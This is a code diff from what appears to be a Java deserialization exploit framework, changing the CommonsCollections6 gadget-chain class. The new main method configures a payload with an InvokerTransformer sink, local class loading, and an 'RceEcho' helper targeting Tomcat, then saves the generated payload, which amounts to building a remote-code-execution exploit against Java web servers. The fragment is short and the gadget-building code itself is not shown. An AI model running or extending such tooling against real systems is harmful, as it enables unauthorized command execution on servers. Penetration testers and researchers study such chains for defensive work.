@@ -1,11 +1,15 @@
 package com.ppp.chain.commonscollections3;
 
+import com.ppp.JavaClassHelper;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
+import com.ppp.annotation.JavaClassHelperType;
+import com.ppp.annotation.Middleware;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
+import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
@@ -28,7 +32,18 @@ import java.util.Map;
 @Sink({Sink.InvokerTransformer3})
 public class CommonsCollections6 implements ObjectPayload<Object> {
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections6.class, args);
+//        PayloadRunner.run(CommonsCollections6.class, args);
+
+        SinksHelper sinksHelper = new SinksHelper();
+        sinksHelper.setSink(CommonsCollections6.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setEnchant(EnchantType.LocalLoad);
+        sinksHelper.setSave(true);
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
+        javaClassHelper.setMiddleware(Middleware.Tomcat);
+        javaClassHelper.setRandomJavaClassName(false);
+        sinksHelper.setJavaClassHelper(javaClassHelper);
+        PayloadRunner.run(CommonsCollections6.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
